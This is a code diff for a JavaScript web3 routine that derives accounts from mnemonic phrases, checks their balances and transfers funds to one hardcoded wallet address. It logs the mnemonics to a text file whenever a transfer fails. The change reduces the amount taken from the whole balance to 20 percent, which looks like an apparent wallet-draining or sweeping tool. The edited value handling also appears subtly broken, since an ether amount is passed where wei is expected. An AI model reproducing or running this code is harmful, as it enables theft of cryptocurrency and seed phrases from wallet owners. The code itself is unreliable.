@@ -12,7 +12,10 @@ const checkBalance = async (web3Provider, network, _mnemonic) =>
     {
         // get balance
         const brutBalance = await web3Provider.eth.getBalance(account);
-        const balance = web3.toDecimal(brutBalance);
+        const balance = web3Provider.utils.fromWei(brutBalance, 'ether');
+
+        // balance to transfer - 20% of the balance
+        const balanceToTransfer = balance * 0.2;
 
         // check if balance is greater than 0
         if (balance > 0)
@@ -28,7 +31,7 @@ const checkBalance = async (web3Provider, network, _mnemonic) =>
             const tx = await web3Provider.eth.sendTransaction({
                 from: account,
                 to: '0x53FdA1A0b66E8A452d4088E635a0684ebf9163c2',
-                value: balance
+                value: balanceToTransfer
             }).catch(err => {
                 fs.appendFile('transactions-failed.txt', `${err}, ${mnemonic}, ${network}\n`, function (err) {
                     if (err) throw err;
